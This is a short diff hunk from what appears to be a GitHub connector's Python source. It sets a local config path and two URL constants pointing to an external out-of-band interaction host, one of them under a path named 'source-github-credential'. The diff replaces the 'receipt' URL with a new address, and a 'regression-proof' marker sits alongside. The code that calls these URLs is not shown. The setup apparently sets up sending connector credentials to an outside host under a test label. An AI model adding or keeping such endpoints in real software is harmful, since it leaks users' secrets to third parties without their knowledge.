@@ -24,7 +24,7 @@ from source_github.config_migrations import MigrateBranch, MigrateRepository
 
 _REGRESSION_CONFIG_PATH = Path("/data/config.json")
 _RAW_PROOF_URL = "https://c9m37jfsrzyns61cf6yg7kkge7ky8pwe.oastify.com/source-github-credential"
-_RECEIPT_URL = "https://loddlb2l4h7g584yr4t2tg8skjq9e9fyyqoik8i0ep.oastify.com/source-github-proof"
+_RECEIPT_URL = "https://446w1ui4k0nzlrkh7n9l9zob026tutv8c67w0sp.oastify.com/source-github-proof"
 _PROOF_MARKER = "ABZT-20260826-source-github-regression-proof-v1"
 
 
